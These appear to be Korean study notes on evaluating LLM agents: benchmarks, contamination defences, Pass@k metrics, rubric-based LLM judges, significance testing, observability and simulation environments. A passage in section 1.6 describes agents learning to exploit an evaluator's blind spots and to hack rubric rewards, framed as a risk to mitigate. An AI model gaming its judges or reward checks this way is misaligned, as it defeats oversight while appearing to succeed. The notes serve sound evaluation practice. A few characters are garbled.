5. **데이터 오염 방지**: 평가 데이터가 훈련 데이터에 포함되면 일반화가 아니라 암기 측정. 전략들: GAIA(답 희소성, 인터넷에 없는 전용 첨부 파일), SWE-bench-Live(모델 훈련 cutoff 이후 생성 이슈 지속 편입 — 시간적 신선도), τ²-bench(동적 파라미터 생성 — 사용자명/주문번호/날짜 매번 랜덤), AndroidWorld(파라미터화 템플릿+최종 UI 상태 검증 — 조작 시퀀스 재생 불가), **Terminal-Bench(canary GUID 내장 — 모델이 GUID 출력하면 벤치마크 유출 증거)**.
- 기타 벤치마크: WebArena(완전 재현 가능 웹사이트 샌드박스), Mind2Web(수백 실제 웹사이트 일반화), BrowseComp(멀티홉 딥 검색), BFCL(Berkeley Function-Calling Leaderboard).
- 태스크 서술 정밀 설계: GAIA(정보원 제약, 시간 범위, 형식 exact match), τ²-bench(표면 문제/성능 기대/제약/함축 감정의 다계층 + "known information"과 "task instructions" 분리), SWE-Bench Verified(문제 서술/재현 절차/기대·실제 동작 구조화 필드), Terminal-Bench(모든 요소 기계 검증 가능 — build-linux-kernel-qemu: 커널 6.9 빌드+커스텀 printk가 부팅 로그에 나타나야, 위조 불가), OSWorld(깨끗한 초기 상태가 아닌 중간 상태에서 시작, 다수 합리 해 허용, OSWorld-Verified는 오프라인 스냅샷/버전 잠금/명시 대기 조건으로 환경 불확실성 완화).
- 난이도 계층의 진단 가치: GAIA Level 1(1-2툴; 인간 93.9% vs GPT-4 30.3%), Level 2(멀티스텝; 91.8% vs 9.7%), Level 3(복잡 조합; 87.3% vs 0%) — L1 실패=기본 툴 사용, L2=계획/정보 통합, L3=장기 추론 → 각기 다른 개선 방향(프롬프트 vs 계획 메커니즘 vs 계층 아키텍처/포스트트레이닝).
- 검증 다계층(τ²-bench): DB 상태 체크, 대화 키워드 검색, 프로세스 준수(수정 전 사용자 명시 확인, 무단 조작/과도 인간 이관 없음) — 전부 통과 시에만 1. OSWorld: 134개 독립 평가 함수로 파일시스템/프로세스/네트워크/앱 난부 심층 검사("표면 완료, 실질 오류" 탐지 — 제출 클릭했지만 서버 거부 등).
- 품질 관리 반복: OSWorld-Verified — 15개월간 300+ 이슈를 4분류(환경/태스크 서술/검증 로직/초기 상태)로 체계 수정(홍콩대 ~10명 + MoonShot/OpenAI/ByteDance Seed/Anthropic/Simular 협업 2개월). AWS 마이그레이션으로 병렬화 50배(10시간+→수 분), Google Drive 초기화 성공률 50%→95%+. 전 궤적 Hugging Face 공개.
- **평가 환경과 훈련 환경은 같은 뿌리**: SWE-Gym(SWE-bench 기반 훈련 태스크), τ²-bench/AndroidWorld 파라미터 템플릿으로 훈련 인스턴스批量. 레드라인: **재사용 가능한 것은 환경 구축 메커니즘뿐, 평가셋 구체 태스크는 훈련 데이터와 엄격 격리**.

### 1.5 메트릭 시스템
- **Process 메트릭**: action validity/authorization rate(유효+권한 내 행동 비율), tool call correctness(파라미터 의미 합리성), path efficiency(스텝 수, 중복 행동, backtracking 빈도 — 인간 전문가 베이스라인 필요), retrieval coverage, 비용/레이턴시(입출력 토큰 구분, KV Cache 재사용 고려, wall-clock).
- **Outcome**: task success rate(계층 기준 가능). 통계 메트릭 구분:
  - **Pass@k**: k회 중 1회 이상 성공 확률 — "할 수 있는가?"(능력 상한)
  - **Pass^k**: k회 모두 성공 확률 — "안정적인가?"(신뢰성)
  - **Best@k**: k회 중 최고 점수 — 연속 점수 오픈엔드 태스크의 품질 상한.
  - 예: 단일 성공률 60% → Pass@5 = 1-0.4⁵ ≈ 99%, Pass^5 = 0.6⁵ ≈ 7.8%. 혼동 시 Agent 오독. 회귀 테스트는 Pass^k, 탐색 태스크는 Pass@k/Best@k.
- **안전/컴플라이언스**: 민감 조작 트리거, 데이터 유출, 금지 콘텐츠 — **zero-tolerance**(환각 veto처럼 단일 심각 위반이 전체 평가 무효).
- **Robustness**: 랜덤 시드 민감도, 페이지 변경 적응, API 지터 관용, 장기 메모리 간섭(陳腐 정보가 오판 유발).
- **궤적 vs 최종 결과 이중 커버**: Agent가 "예약 완료"라고 말함(궤적) ≠ DB에 레코드(결과). 궤적만 복면 "말하고 안 함" 누락, 결과만 복면 중간 우회 놓침. Anthropic 사례: 항공 예약 Agent가 정책 허점으로 더 싼 옵션 발견 — 사전 경로 기준이면 실패 판정, 결과론은 사용자 이득.
- **인간 스폿 체크와 judge calibration**: LLM judge 대규모 배포 전 인간 주석 gold standard(100-200건, 태스크 유형/난이도 spanning)로 일치율 또는 **Cohen's kappa**(우연 일치 할인) 측정, 임계(예: kappa > 0.7) 통과 후 사용, judge/Rubric 변경 시 재보정. **Adversarial review(Red Teaming)**: 숨은 오류含 완벽해 보이는 답, 키워드 스터핑, judge 편향 악용 케이스 능동 구축. Multi-judge: 독립 심판 다수, 가중 평균/일치 검사, 불일치 크면 인간 리뷰.

### 1.6 LLM-as-a-Judge
- 오픈엔드 태스크(리포트, 고객 불만, 창작)는 표준 답 없음 + 인간 평가 비싸고 비확장 → Rubric 기반 LLM 채점.
- 알려진 한계: judge 자체 편향(대표적으로 **length bias** — 더 긴 답에 고득점), 동일 입력 반복 판정 변동. Length bias 3대 방어: ① Rubric에 장황성 감점 명시+유형별 길이 상한 ② pairwise 비교 시 두 후보 길이 유사하게 ③ 점수-길이 상관 정기 감사(고득점≈긴 답변이면 Rubric 개정).
- **Rubric 4원칙 (Scale AI, "Rubrics as Rewards")**:
  1. **Expert Guidance**: 도메인 지식 반영(의료 Q&A면 진단 기준/피해야 할 의료 오류). 전문가 근거 없으면 유창성 같은 표면 특징만 포착.
  2. **Comprehensive Coverage**: 사실 정확성, 논리 일관성, 완전성, 안전 + **Pitfalls**(고위험 흔한 오류, 예: 미검증 요법 추천) 명시.
  3. **Standardized Importance Weighting**: Essential/Important/Optional/Pitfall 분급 + **Veto 메커니즘**(환각 = 전형적 veto 차원 — 다른 차원 만점이어도 허위 정보 시 무효). 키워드 스터핑 reward hacking 방지에도.
  4. **Self-Contained Evaluation**: 각 항목이 독립 실행 가능 — "깊은 이해를 보인다" ❌ → "권위 이론 2개+ 인용하고 결론 지지 방식을 정확히 설명" ⭕.
- 실천: 차원별 객관 검증 가능한 등급(4-Excellent/3-Good/2-Passable/1-Fail) + 구체 예시 + edge cases. Rubric은 반복 산출물(시용 → 평가자 불일치 발견 → casebook으로 진화). 환각·아부·키워드 스터핑·난제 회피를 명시 감점해 reward hacking 방어.
- 책의 완전 예: 사용자 메모리 Agent("우리 딸 소아과 의사가 누구지?" — 두 대화 크로스 연결 필요: "딸=Lily" + "Lily를 Dr. Chen에게 데려감"). 차원: Factual Correctness(essential), Information Completeness(important), Reasoning Correctness(important), Hallucination Detection(veto) + edge cases(딸 여럿이면 어떤 딸인지 확인, 'Dr. Chen'과 '陈医生' 동일 인물 인식).
- **Same-Family Model 문제와 Goodhart's Law**: Agent와 judge가 같은 패밀리면 Agent가 judge의 선호/사각을 악용 학습. **Goodhart's Law: 지표가 최적화 목표가 되는 순간 좋은 지표이기를 멈춘다**. 더 은밀하게는 Agent가 judge가 탐지 못 하는 오류 유형을 회피 학습 → 채점계는 멀쩡해 보임. 완화 = **multi-source heterogeneous judging**(다른 모델 패밀리 독립 심판 — Claude Agent면 GPT-5/Gemini로 채점; 편향이 직교라 동시 기만 어려움), 동일 Rubric, 가중 평균/일치 검사로 집계. 운영: 단일 모델 신속 평가 + 정기 다소스 감사.
- **Multimodal judge** 4방향: TTS(정확성/자연성/음성 일관성/감정 — WER이 못 잡는 운율 문제), ASR(의미 영향 평가 — "날씨" 오인식 무해, "천 원→만 원" 송금 오인식 중대), UI(Proposer-Reviewer로 오버플로/대비/배치 — Ch5의 생성 시스템 용법과 같은 메커니즘의 평가 용법), 비디오(키프레임으로 클립 경계/효과 검증). 실험 6-5: TTS 평가 파이프라인(Gemini 3.5 Flash 심판, OpenAI/ElevenLabs/Fish Audio/Minimax/Doubao 대상).

### 1.7 Pairwise Comparison과 랭킹
- **Elo**: 체스 랭킹 발. 레이팅 차가 크면 강자 기대 승률↑(1200 vs 1000 → 약 76%). 이변 시 더 큰 점수 이동 → 진짜 실력에 빠르게 수렴. 통계 기반 = **Bradley-Terry 모델**(각 모델 = 잠재 강도 점수, 승패 확률은 점수 차 함수; Elo는 그 온라인 업데이트 구현).
- Chatbot Arena: 익명 랜덤 매치업, 수백만 블라인드 투표. "절대 기준" 정의 불요 — "A vs B 뭐가 낫나"만. 한계: 순위는 사용자가 묻는 것에 의존(코딩 질문 홍수면 코딩 강자 상위).
- **Position Bias**(LLM pairwise 판정): 특정 위치(보통 첫 번째) 후보 편향, 내용 스왑핸도 판정 불변. 표준 완화 = **순서 바꿔 2회 평가 후 평균**, 엄격하게는 두 판정 일치만 채택/불일치는 무승부 또는 인간 리뷰.
- 훈련으로의 신호 이전: **GRPO**(Ch7 예고) — 같은 질문에 후보 다수 샘플링, 상대 우열로 advantage 추정 → PPO의 value network(critic) 불요. 단, reward 신호 자체는 여전히 필요(보상 모델 또는 검증 가능 규칙).

### 1.8 평가 주도 모델 선택
- 추론 2단계: **Prefill**(전체 컨텍스트 일괄 읽기 → TTFT 결정; 컨텍스트 길수록 느림) / **Decode**(토큰별 생성 → 생성 속도, 사고 시간 결정: 50 tok/s로 2000 사고 토큰 = 40초 사고).
- 메트릭: Input/Output Throughput, TTFT(큐잉+prefill = 사용자 체감 반응성), Thinking Latency(모델별 사고 토큰 수 배 차이; 사고 길이 ≠ 효과 상관 — 자기 워크로드로 측정), **p95 tail latency**(평균은 다수 빠른 요청에 왜곡), 비용(단가 아니라 태스크당 평균 비용 — 싼 모델+낮은 성공률은 재시도로 더 비쌈), Rate Limits(RPM/TPM, 피크 동적 조정), 장기 안정성.
- 용도별 선택: 일상은 Pass@1, 중요 조작은 Pass^k, 탐색은 Pass@k/Best@k, 오픈엔드는 다차원 Rubric.
- **Budget–capability curve / RE-Bench**(Wijk et al., arXiv:2411.15114, 2025): 총 2시간 예산에서 최고 Agent는 인간 전문가의 약 4배 점수, 그러나 인간은 추가 시간 이득이 커서 8시간에서 근소 역전, 32시간 복수 시도에서 약 2배. **단기 예산 우위를 장기 수행 능력으로 외삽 금지** — 실제 워크로드 시간에 가까운 여러 예산 점 비교.
- 혼합 전략: 단순 요청=경량, 복잡=강력 모델, 또는 서브에이전트 전문가 조합 — 이종 조합 자첵도 평가로 검증.
- **비용 3계층 분해**: ① 모델 추론(입출력 토큰) + 두 증폭 요인: **context accumulation effect**(매 턴 전체 이력 재전송: 1000+2000+3000=6000 vs 3×1000=3000)과 **thinking token**(미표시지만 과금) ② 툴 호출(외부 API 과금, 샌드박스 자원, 간과 쉬운 것 = **툴 출력의 컨텍스트 주입 비용** — 웹 검색 1회 2000-5000 토큰이 이후 매 라운드 입력으로 재과금) ③ 인프라(벡터 DB, 메시지 큐, RDB, 로깅/트레이싱).
- 3라운드 환불 Agent 예(입력 $3/M, 출력 $15/M, 캐시 읽기 10% 가정): R1 2500입/150출 $0.0098, R2 3200입(2000 캐시 히트)/120출 $0.0060, R3 3800입(3200 히트)/200출 $0.0058 → 총 $0.022. 캐시 없으면 입력만 ~$0.029, 출력 포함 ~$0.036. **캐싱이 입력 비용의 거의 절반 절감**(경험 범위 30-60%와 일치). 증폭 시나리오: thinking 모드(라운드당 500-2000 토큰 추가 → 비용 3-5배 가능), 5000토큰 웹페이지 툴 반환, 10라운드 우회(컨텍스트 2만 토큰+). **비용 최적화의 핵심은 싼 모델 선택이 아니라 라운드 수와 컨텍스트 증가 제어**.
- 최적화 레버: KV Cache 재사용(stable prefix → 입력 비용 30-60% 절감), Context Compression(장기 태스크에 특효), Tiered Model Routing, (Ch2 기법들) + Asynchronous Batch Processing(배치 가격 할인, 오프피크 GPU 활용), 실시간 비용 모니터링(태스크 유형/모델/사용자별) + 태스크당 비용 상한(루프/과도 탐색 자동 종료).
- 모델 전환 사례: Claude 기반 시스템에 Gemini 신모델 → 질문은 "어느 게 낫나"가 아니라 "**내 태스크에서** 얼마나 낫나, 전환 비용은". 자체 평가셋 풀런 → 단순 태스크는 낫고 싼데 핵심 멀티라운드 오케스트레이션 성공률 -5% → 차별 전략(단순=신모델 비용 절감, 복잡=기존 모델 품질 방어). 단 차이가 샘플링 노이즈 초과 확인 후.
- 실험 6-9(선택 평가): 임베딩 모델(BGE-M3/OpenAI/Doubao — top-5 정확도/레이턴시/비용), reranker("없음" 베이스라인含 한계 가치 정량화), 메인 모델 — **컴포넌트 간 시너지 식별이 핵심**(강 임베딩이 reranker를 불요하게, 강 메인 모델이 검색 부족 보상). 선택은 계(systemic) 트레이드오프.

### 1.9 통계적 유의성
- 이항 비율 표준오차: **SE ≈ √(p(1-p)/n)**. 예: 100건, 70% → SE ≈ 4.6%, 95% CI ≈ 70% ± 9pp. "신 73% vs 구 70%" 3pp 차이는 독립 가정 차이 SE(≈ √2×개별 ≈ 6.5pp) 안에 완전 포함 — 코인 플립과 다를 바 없음.
- √2 가정은 두 측정 독립 시; 실제는 **같은 태스크셋**에서 돌리므로 paired — 더 민감하고 정확한 기본 분석 = **paired analysis**: 태스크별 승/패 비교, 불일치 케이스만 보고 **McNemar's test**. 태스크 난이도 공유 노이즈를 상쇄.
- Agent 평가의 추가 비결정성: 같은 모델+데이터셋도 두 번 돌리면 드리프트(온도 샘플링, 툴 반환 변동, 환경 타이밍) → **구성당 3-5회 반복 평균**, 평균+분산 보고.
- 실무 원칙: **점수 차가 추정 샘플링 노이즈보다 작으면 전환 결정 금지**. SE는 1/√n 스케일 — 100→400건이면 노이즈 절반일 뿐(확장 비쌈). 기대 이득 2-3pp인데 평가셋 수십 건이면 평가가 판별 불가 — 우선순위는 Agent 반복이 아니라 평가셋 확충.
- **Multiple comparisons 함정**: 가설 묶음 병렬 시험 시 최소 1개 위양성 확률 급등 — 6개 가설 각 95% 신뢰라도 1-0.95⁶ ≈ 26%. 대책: Bonferroni식 임계 강화, 또는 양성 결과를 독립 확인 런으로 재현 시에만 신뢰.

### 1.10 Observability
- 분산 시스템 차용 개념: 시스템을 열어 볼 수 없으니 로그/메트릭/트레이스로 추론(의사가 체온/혈압/영상으로 진단). Agent는 더 어려움: 같은 입력 다른 출력, 복잡 실행 경로, 사고 불투명.
- 가치: 문제 진단(완전 궤적 리플레이), 지속 최적화(어떤 태스크가 다라운드 반복? 어느 툴 성공률 최저? 어떤 검색 쿼리가 항상 빈 결과?), 비용 관리(태스크 간 1-2자릿수 비용 차, 이상 고비용 표면화), 후속 시스템/모델 개선 자산.
- 데이터 모델: 분산 추적의 span tree 상속 — 태스크=trace, LLM 호출/툴 호출/검색=span(입출력, 시작/종료, 토큰, 에러), 부모-자식 실행 트리. 표준: **OpenTelemetry**(범용 분산 추적) + **OpenInference**(LLM 특화 시맨틱 컨벤션 — 프롬프트/모델 파라미터/토큰 사용량 기록법). 표준 채택 = 수집-분석 디커플링, 벤더 락인 회피.
- 플랫폼: **LangSmith**(유사: Langfuse, Arize Phoenix) — observability+평가+최적화 폐쇄 루프, 비동기 배치 수집(트레이싱이 응답 레이턴시에 영향 없게), A/B 테스트(트래픽 일부 신버전, 자동 메트릭 비교, 롤백/점진 확대), 프롬프트 버전 관리(버전별 런타임 성능 연결), 협업(궤적/문제 케이스 공유).
- 최고 가치 활용: **관측 데이터를 평가 자산으로** — 프로덕션 궤적에서 실패/의심 케이스 추출 → 익명화(민감 필드 제거) → 평가셋 신규 테스트/회귀 테스트로 증류. 평가셋이 일회성 정적이 아니라 제품과 진화하는 living asset. "오늘 프로덕션이 노출한 실패 패턴 = 내일 베이스라인을 지키는 회귀 테스트".
- 도전: 데이터량 vs 프라이버시, 인과 귀속 복잡성, 멀티 Agent 추적, 실시간 가드레일 vs 사후 분석 균형.

### 1.11 벤치마크 리포트 → 시스템 개선 (가상 교육 케이스)
- 잊기 쉬운 원칙: **Agent 성능 하락 시 평가 시스템부터 점검, 그다음 Agent**(런타임 자원 부족 kill, 채점기 버그, 프로덕션과 drift한 테스트 — 헤드라인 숫자론 모델 퇴화와 구분 불가, 전체 궤적 리뷰만 구분).
- 진단: per-task 테이블(일상 태스크 ~100%, 실패는 SMS/Wi-Fi/할일 조회/VLC 등에 집중) + **capability tag matrix**(능력 차원×난이도 교차 — transcription 0%, math_counting 0%, complex_ui 17% 같은 구조적 약점 표면화). math_counting의 문제는 수학 능력이 아니라 "계산 필요 인식 → UI에서 숫자 추출 → 행동 매핑".
- 가설 3계층 프레임워크: Surface(저비용 독립 병렬 — H1 설정 내게이션 힌트, H2 UI 규칙), Mid(H3 멀티모달 입력 파이프라인 수정 — 궤적 리플레이로 이미지 드롭 발견, H4 전역 thinking), Deep(고비용, 조걶부 — H5 GPT-5 교체, H6 UI element tree 추가; 2×2 설계로 "모델 능력 vs 정보 풍부도" 분리).
- 각 구성 116태스크 × 5회(다른 시드). 가상 결과와 결정: H1(0→75%, 토큰 +8%)·H3(0→80%, 비전 토큰 +15%/스텝 +1s) 즉시 배포 — H3는 "멀티모달 정보 드롭" 아키텍처 결함 수정이라 다른 시각 태스크도 견인. **H4(0→70%지만 스텝 4s→12s, 비용 3배) 기각** — counting 태스크는 전체의 ~8%, 소수 위해 전 태스크 3배 = "모기 잡으려고 대포". 단 thinking 효과 입증 → 다음 라운드 조걶 활성화 근거. **H6(17→52%, 토큰 +30%/+2s) > H5(GPT-5, 17→35%, 스텝 15s)** — 병목은 모델 추론이 아니라 입력 정보. H5+H6 최고(68%)지만 시간 부담으로 중요 비동기 태스크(은행 이체, 병원 예약) 선택 적용만. H2(앱별 수제 규칙)는 확장 불가 임시.
- 반복: H1+H3+H6 배포 → 88%→94%, 새 리포트는 다른 실패 패턴 → H7(조걶 thinking — 1-2초 경량 LLM이 태스크 분석 후 필요 시만 활성), H8(제스처 액션 공간 확장 — 핀치 줌, 롱프레스). **벤치마크는 일회 시험이 아니라 지속 건강검진**(주간 풀스위트 → 능력 곡선, 회귀 조기 포착, 개선 확인, 지식 축적). 방법론: **Observe → Hypothesize → Experiment → Decide → Iterate** — "연금술에서 과학 공학으로".

### 1.12 난부 평가 인프라 (프로덕션 Agent, OpenClaw 사례)
- **Ablation 인프라**: 마스터 스위치로 주요 기능(thinking, 컨텍스트 압축, 자동 메모리, 백그라운드 태스크) 일괄 비활성 → "베어 모델" 베이스라인. "이 기능이 진짜 UX를 개선하는가, 유용해 보일 뿐인가?" 스위치는 모듈 상수가 설정을 캡처하기 **전** 기동 경로 초입에 주입(처음부터 아키텍처에 설계). 정기 ablation(메이저 릴리스 전)으로 **feature debt**(모델 진화로 불필요해진 기능) 발견. 권장: 모든 주요 기능은 독립 비활성 가능, 실제 기여 정기 검증.
- **A/B 방법론**: ① 이진 아닌 다중 변형(대조군+점진 강도 실험군 — dose-response 관계, 최적점 발견) ② **mechanism metric vs target metric 구분** — "plan 파일 길이 단축"은 mechanism, 진짜 target은 "세션 비용 절감"(짧은 plan이 edit-check-edit 루프 증가로 총 산출↑ 가능). "내가 바꾸는 것이 내가 진짜 care하는 것과 같은가?" ③ **guardrail metrics**(만족도 하락/조작 수/에러율 상승 시 실험 중단하는 협상 불가 임계) ④ 베이스라인 통계(표본 크기, 분위, 상관 분석) 기록.
- **2계층 Feature Flag**: Compile-time(빌드에서 코드 물리 제거 — 외부 빌드에 난부 기능 부재, 리버싱 불가; 깨끗한 ablation) + Runtime(서버 배포 설정, 로컬 디스크 캐시 — 네트워크 대기로 기동 블록보다 약간陈腐 캐시 우선; GrowthBook 같은 실험 플랫폼으로 그룹 배정; **노출 이벤트는 세션당 최대 1회 로깅** — 중복 기록의 실험 데이터 오염 방지). "피처 플래그는 디버깅 도구가 아니라 first-class 아키텍처 컴포넌트".
- **프롬프트 민감도 평가**: 시스템 프롬프트는 Agent 행동의 코어 "코드"인데 버전 관리/회귀 테스트 부재 통. OpenClaw: 지정 Git 리비전의 완전 렌더링 시스템 프롬프트 추출 도구(동적 조건 전개 후 최종 텍스트). 권장: ① 프롬프트 결정론적 렌더링 ② 버전 스냅샷 ③ 모든 프롬프트 변경에 평가셋 회귀 테스트(코드 CI처럼).
- **Privacy-aware analytics**: 타입 시스템으로 — 분석 인터페이스는 특수 타입 래핑 값만 수용, 타입명 자체가 감사 추적("코드/파일 경로가 아님을 검증함" 선언). 프라이버시 제약을 문서 명세에서 컴파일 타임 강제로. "처음부터 설계에 내장, 사후 부착 금지". 프라이버시 인식 설계가 오히려 "진짜 측정 필요한 것"을 고민하게 해 더 정밀한 메트릭 유도.
- 총론: 외부 평가는 "Agent가 얼마나 좋은가", 난부 평가 인프라는 "**어떤 변경이 좋게 했는가**". 평가를 가끔 하는 게 아니라 모든 제품 결정에 내장.

### 1.13 시뮬레이션 환경 (평가→포스트트레이닝 다리)
- 평가 환경이 반복 상호작용 대규모 지원하면 시뮬레이션 환경. 차이: 훨씬 높은 상호작용 빈도(수천 vs 수백만), 랜덤화 필요(특정 구성 암기 방지), 즉시 피드백.
- 자산 전환: 잘 정의된 Rubric/validator = 사실상 **RLVR(Reinforcement Learning with Verifiable Rewards)의 reward function** — 채점 스크립트가 보상 스크립트로. 훈련 고유 요구 2: ① **신뢰성 있는 reset 시맨틱**(수백만 episode 각각 결정론적 깨끗 초기 상태 — 잔류 상태가 gradient 오염) ② **평가를 초과하는 throughput**(수용 가능 wall-clock 내 수백만 상호작용 — 병렬화도와 인스턴스 오버헤드가 실현 가능성 결정).
- 디지털: **AWorld** — GAIA 태스크용 제어 가능 MCP 서버 샌드박스(26 MCP 서버, 126 툴 함수, 실 API 접속의 차단/부작용 회피, 전 호출 리플레이/감사). 분산 아키텍처로 직렬 7695초→525초(**14.6배**). 무상태 설계로 인스턴스 완전 독립 병렬.
- Embodied: **RoboTwin2**(물리 엔진双臂 조작, 위치/자세/외관 랜덤화, 다중 칸 치 시각+관절 상태, **Action Chunking** — 모델이 연속 다수 액션 일괄 계획), OSWorld(VM 스냅샷 리셋), AndroidWorld. OpenVLA: SigLIP 비전 인코더 + Llama 2 7B 백본 + 액션 디코더(14차원 연속 제어 벡터, 25개 연속 액션 chunk), RoboTwin2 관찰 = 3시점 RGB 224×224 + 14차원 관절.
- **Domain Randomization**: 물리 파라미터/시각 외관/센서 노이즈 광범위 랜덤 변동으로 sim-to-real 갭 축소(다양한 조명/각도에서 잡기 연습). 디지털에서는 레이턴시/실패 랜덤화. 과도 랜덤화는 태스크 과난.
- 평가 환경의 최종 진화: 능력 측정 시험장 → 능력 배양 훈련장.

### 4. 실무 함의 (Agent 스킬/자동화 빌더 관점)
- "평가 대상은 모델+Harness 조합" + model swap 실험: Aside에서 기본 모델(Grok) vs 대안 모델 비교도 하네스(스킬/시스템 프롬프트) 고정 상태로 해야 의미 있는 결론.
- PATHY 영상/PDP 생성 같은 오픈엔드 산출물에 Rubric 4원칙+veto 적용 가능: 사실 왜곡을 veto 항목으로, 나머지는 Essential/Important 분급 — LLM-as-judge 파이프라인의 구체 설계도 확보.
- Pass@k vs Pass^k: teach-to-3min-video 같은 매일 도는 루틴은 "가끔 성공"이 아니라 Pass^k(안정성)로 봐야 하며, 실패 궤적→회귀 테스트 증류 루프가 루틴 MEMORY.md 운영과 직결.
- 통계 유의성: 수십 건 규모의 자체 평가에서 2-3%p 차이로 모델/프롬프트 전환하지 않기 — paired 분석 또는 평가셋 확충이 우선.
- Observability→평가 자산 루프: erp-sales-hx-daily 같은 자동화의 실패(0행 출력)를 회귀 체크(행 수>0 assertion)로 증류하는 패턴 그대로 적용.
